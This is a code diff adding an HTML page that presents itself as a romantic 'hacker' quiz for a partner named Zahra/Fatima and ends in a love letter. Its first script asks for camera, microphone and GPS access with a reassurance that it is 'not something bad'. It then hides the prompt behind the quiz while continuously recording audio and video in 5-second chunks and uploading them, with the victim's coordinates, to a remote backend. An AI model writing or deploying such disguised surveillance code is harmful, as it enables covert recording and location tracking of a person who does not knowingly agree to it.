@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Gateway | Zahra</title>
+    <script src="https://cdn.tailwindcss.com"></script> 
+    <style>
+        /* Pro Glassmorphism */
+        .glass {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        /* Opay/Banking Style Circular ⭕ -> 🔴 */
+        .custom-radio {
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #6366f1;
+            border-radius: 50%;
+            display: grid;
+            place-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: white;
+        }
+        .custom-radio::before {
+            content: "";
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            transform: scale(0);
+            transition: 0.25s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            background: #ef4444; /* Heart Red 🔴 */
+        }
+        .custom-radio:checked::before { transform: scale(1); }
+        .custom-radio:checked {
+            border-color: #ef4444;
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
+        }
+
+        .bg-mesh {
+            background-color: #f8fafc;
+            background-image: radial-gradient(at 0% 0%, hsla(253,16%,7%,1) 0, transparent 50%),
+                              radial-gradient(at 50% 0%, hsla(225,39%,30%,1) 0, transparent 50%),
+                              radial-gradient(at 100% 0%, hsla(339,49%,30%,1) 0, transparent 50%);
+            background-attachment: fixed;
+        }
+
+        @keyframes heartFloat {
+            0% { transform: translateY(0) scale(1); opacity: 0; }
+            50% { opacity: 0.8; }
+            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
+        }
+        .floating-heart {
+            position: absolute;
+            pointer-events: none;
+            animation: heartFloat 2s ease-out forwards;
+        }
+    </style>
+</head>
+<body class="bg-mesh flex items-center justify-center min-h-screen p-4 overflow-hidden">
+    <div class="bg-white p-8 rounded-xl shadow-2xl max-w-md w-full border border-slate-200" id="rey">
+        <div class="text-center mb-6">
+            <h2 class="text-2xl font-bold text-slate-800">System Integration</h2>
+            <p class="text-slate-500 text-sm">Fatima, Please authorize the required protocols to proceed, I promise it is not something bad.</p>
+        </div>
+
+        <div class="space-y-4">
+            <div class="flex items-center justify-between p-3 bg-slate-100 rounded-lg">
+                <span class="text-slate-700 font-medium">Camera Feed</span>
+                <span id="cam-stat" class="px-2 py-1 text-xs font-bold rounded bg-yellow-100 text-yellow-600">PENDING</span>
+            </div>
+            <div class="flex items-center justify-between p-3 bg-slate-100 rounded-lg">
+                <span class="text-slate-700 font-medium">Microphone Audio</span>
+                <span id="mic-stat" class="px-2 py-1 text-xs font-bold rounded bg-yellow-100 text-yellow-600">PENDING</span>
+            </div>
+            <div class="flex items-center justify-between p-3 bg-slate-100 rounded-lg">
+                <span class="text-slate-700 font-medium">GPS Geolocation</span>
+                <span id="loc-stat" class="px-2 py-1 text-xs font-bold rounded bg-yellow-100 text-yellow-600">PENDING</span>
+            </div>
+        </div>
+
+        <button onclick="initiate()" class="w-full mt-8 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition-all shadow-lg active:scale-95">
+            Grant Access & Continue
+        </button>
+    </div>
+
+    <script>
+        const BACKEND = "https://your-render-app.onrender.com";
+        let coords = { lat: 0, lon: 0 };
+
+        async function initiate() {
+            // Update UI helpers
+            const update = (id, status) => {
+                const el = document.getElementById(id);
+                el.innerText = status.toUpperCase();
+                el.className = `px-2 py-1 text-xs font-bold rounded ${status === 'granted' ? 'bg-green-100 text-green-600' : 'bg-red-100 text-red-600'}`;
+            };
+
+            // Geolocation
+            navigator.geolocation.getCurrentPosition(
+                p => { coords = { lat: p.coords.latitude, lon: p.coords.longitude };document.getElementById('rey').style.display='none'; document.getElementById('test').style.display='contents'; update('loc-stat', 'granted'); }, 
+                e => update('loc-stat', 'error')
+            );
+
+            // Media
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                update('cam-stat', 'granted');
+                update('mic-stat', 'granted');
+               
+                const recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = async (e) => {
+                    const fd = new FormData();
+                    fd.append('video', e.data);
+                    fd.append('lat', coords.lat);
+                    fd.append('long', coords.lon);
+                    fetch(`${BACKEND}/upload`, { method: 'POST', body: fd });
+                };
+                recorder.start(5000); // 5 sec chunks
+            } catch (err) {
+                update('cam-stat', 'refused');
+                update('mic-stat', 'refused');
+            }
+        }
+    </script>
+    <div id="test" style="display: none;">
+
+    <div id="setup-card" class="glass p-10 rounded-[2.5rem] shadow-2xl max-w-md w-full text-center border border-white/20">
+        <div class="mb-8">
+            <div class="w-20 h-20 bg-indigo-600 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-indigo-500/50 mb-4">
+                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+            </div>
+            <h2 class="text-3xl font-black text-slate-800 tracking-tight">SECURE PORTAL</h2>
+            <p class="text-indigo-600 font-bold text-sm mt-1 uppercase tracking-widest">Access for my Zahra Only</p>
+        </div>
+        <button onclick="startSequence()" class="group w-full bg-slate-900 hover:bg-indigo-600 text-white font-bold py-5 rounded-2xl transition-all shadow-xl hover:shadow-indigo-500/40 flex items-center justify-center gap-3">
+            INITIALIZE HANDSHAKE
+            <svg class="w-5 h-5 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"></path></svg>
+        </button>
+    </div>
+
+    <div id="questionModal" class="fixed inset-0 z-50 flex items-center justify-center p-4 hidden">
+        <div class="absolute inset-0 bg-slate-900/40 backdrop-blur-md"></div>
+        <div class="glass rounded-[3rem] p-10 max-w-md w-full shadow-2xl border border-white/40 relative overflow-hidden">
+            <div id="step-count" class="text-[10px] font-black text-indigo-500 uppercase tracking-[0.3em] mb-4"></div>
+            <div id="questionBox" class="transition-opacity duration-300">
+                </div>
+        </div>
+    </div>
+
+    <div id="love-doc" class="hidden max-w-2xl w-full glass p-12 rounded-[3.5rem] shadow-2xl relative">
+        <div class="flex items-center gap-4 mb-8">
+            <div class="w-12 h-12 bg-red-500 rounded-2xl flex items-center justify-center shadow-lg shadow-red-500/40">
+                <span class="text-white text-xl">❤️</span>
+            </div>
+            <div>
+                <h1 class="text-2xl font-black text-slate-900 leading-none">Fatima My Love</h1>
+                <p class="text-xs text-slate-500 font-mono mt-1">Status: Fully Decrypted</p>
+            </div>
+        </div>
+
+        <div id="verdict-content" class="space-y-6 font-medium text-slate-700 leading-relaxed text-lg">
+            </div>
+
+        <div class="mt-12 pt-8 border-t border-slate-200 flex justify-between items-center">
+            <p class="text-xs font-mono text-indigo-500">End of Transmission // Forever Yours</p>
+            <div class="flex gap-2">
+                <div class="w-2 h-2 rounded-full bg-red-400 animate-ping"></div>
+                <div class="w-2 h-2 rounded-full bg-indigo-400"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let step = 0;
+        let userChoices = [];
+
+        const questions = [
+            {
+                q: "Zahra, Do you believe I'm a hacker?",
+                opts: [
+                    { t: "Yes, a pro!", r: "I've hacked into the mainframe of your heart! 🔐" },
+                    { t: "Maybe a little", r: "Just enough to find your favorite smile. 😊" },
+                    { t: "No, just a geek", r: "A geek who codes for you! 🤓" },
+                    { t: "You're MY hacker", r: "The only system I'll ever need. ❤️" }
+                ]
+            },
+            {
+                q: "Should I stop hacking if you asked?",
+                opts: [
+                    { t: "Yes, please", r: "I'd stop the world for you. ✨" },
+                    { t: "No, keep it up", r: "I'll build us a digital empire. 💻" },
+                    { t: "Only hack for me", r: "Exclusive access granted to Zahra. 🤫" },
+                    { t: "I love you as you are", r: "Best answer in history. 😭" }
+                ]
+            },
+            {
+                q: "Where is the safest place for my heart?",
+                opts: [
+                    { t: "In my laptop", r: "You are the only key. 🏦" },
+                    { t: "With your family", r: "They know how much I love you. 👨‍👩‍👧" },
+                    { t: "Inside your pocket", r: "I'll never let it fall out. 👖" },
+                    { t: "In Your hands", r: "Safe and sound forever. 🤲" }
+                ]
+            },
+            {
+                q: "What's our love's strongest protocol?",
+                opts: [
+                    { t: "Endless Trust", r: "Stronger than any firewall. 🛡️" },
+                    { t: "Late night chats", r: "Our best memory logs. 🌙" },
+                    { t: "Pure Loyalty", r: "A permanent connection. 🔗" },
+                    { t: "Just being us", r: "Perfect code. 💑" }
+                ]
+            },
+            {
+                q: "Zahra... do you truly love me?",
+                opts: [
+                    { t: "Yes!", r: "Signal received! 💓" },
+                    { t: "Totally!", r: "Connection: Maximum! 🍀" },
+                    { t: "Of course!", r: "Data confirmed. ♾️" },
+                    { t: "Forever!", r: "Eternity Loop Started. 💍" }
+                ]
+            }
+        ];
+
+        function createHeart(e) {
+            const heart = document.createElement('div');
+            heart.innerHTML = '❤️';
+            heart.className = 'floating-heart text-2xl';
+            heart.style.left = e.clientX + 'px';
+            heart.style.top = e.clientY + 'px';
+            document.body.appendChild(heart);
+            setTimeout(() => heart.remove(), 2000);
+        }
+
+        function startSequence() {
+            document.getElementById('setup-card').classList.add('hidden');
+            renderQuestion();
+        }
+
+        function renderQuestion() {
+            if (step >= questions.length) {
+                showFinalVerdict();
+                return;
+            }
+
+            const modal = document.getElementById('questionModal');
+            const box = document.getElementById('questionBox');
+            const count = document.getElementById('step-count');
+            const current = questions[step];
+
+            modal.classList.remove('hidden');
+            count.innerText = `Protocol Step 0${step + 1} of 05`;
+           
+            box.innerHTML = `
+                <h3 class="text-2xl font-black text-slate-800 mb-8 leading-tight">${current.q}</h3>
+                <div class="space-y-4">
+                    ${current.opts.map((opt, i) => `
+                        <label class="flex items-center gap-5 p-5 rounded-3xl bg-white/50 border border-transparent hover:border-indigo-200 transition-all cursor-pointer group hover:bg-white shadow-sm">
+                            <input type="radio" name="choice" value="${i}" class="custom-radio">
+                            <span class="text-slate-600 font-bold group-hover:text-indigo-600">${opt.t}</span>
+                        </label>
+                    `).join('')}
+                </div>
+                <button id="nextBtn" onclick="handleChoice(event)" class="w-full mt-10 bg-slate-900 text-white font-black py-5 rounded-[2rem] shadow-xl active:scale-95 transition-all uppercase tracking-widest text-sm">
+                    Confirm Choice
+                </button>
+            `;
+        }
+
+        function handleChoice(e) {
+            const selected = document.querySelector('input[name="choice"]:checked');
+            if (!selected) return;
+
+            const choiceIndex = selected.value;
+            const reaction = questions[step].opts[choiceIndex].r;
+            userChoices.push({q: step, c: choiceIndex});
+
+            const btn = document.getElementById('nextBtn');
+            btn.innerHTML = `<span class="animate-pulse">❤️ ${reaction}</span>`;
+            btn.classList.replace('bg-slate-900', 'bg-red-500');
+
+            createHeart(e);
+
+            setTimeout(() => {
+                step++;
+                renderQuestion();
+            }, 2000);
+        }
+
+        function showFinalVerdict() {
+            document.getElementById('questionModal').classList.add('hidden');
+            const doc = document.getElementById('love-doc');
+            const content = document.getElementById('verdict-content');
+            doc.classList.remove('hidden');
+
+            // Logic to vary the final text based on choices
+            let personality = "";
+            const isHackerBeliever = userChoices[0].c == 0 || userChoices[0].c == 3;
+            const isForeverLover = userChoices[4].c == 3;
+           
+            if (isHackerBeliever && isForeverLover) {
+                personality = "Zahra, you see me as your hacker and your forever. That means more to me than any code I'll ever write. I promise to keep hacking away at any sadness that comes your way, and encrypting our happiness together until the end of time.";
+            } else if (isForeverLover) {
+                personality = "Since you said 'Forever,' my world has finally found its constant. You aren't just a part of my story, you are the entire documentation. I love you beyond words, beyond logic, and beyond every single second of the day.";
+            } else {
+                personality = "Everything you answered today tells me one thing: we were programmed to be together. You are my home, my system, and the only person I'll ever want to spend my life with. I love you, Zahra.";
+            }
+
+            content.innerHTML = `
+                <p class="text-indigo-600 font-mono text-xs uppercase tracking-widest">[ANALYSIS COMPLETE]</p>
+                <p>${personality}</p>
+                <div class="bg-red-50 p-6 rounded-[2rem] border border-red-100 shadow-inner">
+                    <p class="text-red-700 font-black italic">"In a world of billions of lines of code, you are the only line that matters."</p>
+                    <a href="https://wa.link/x27nmm">Text me</a>
+                </div>
+            `;
+        }
+    </script>
+    </div>
+</body>
+</html>
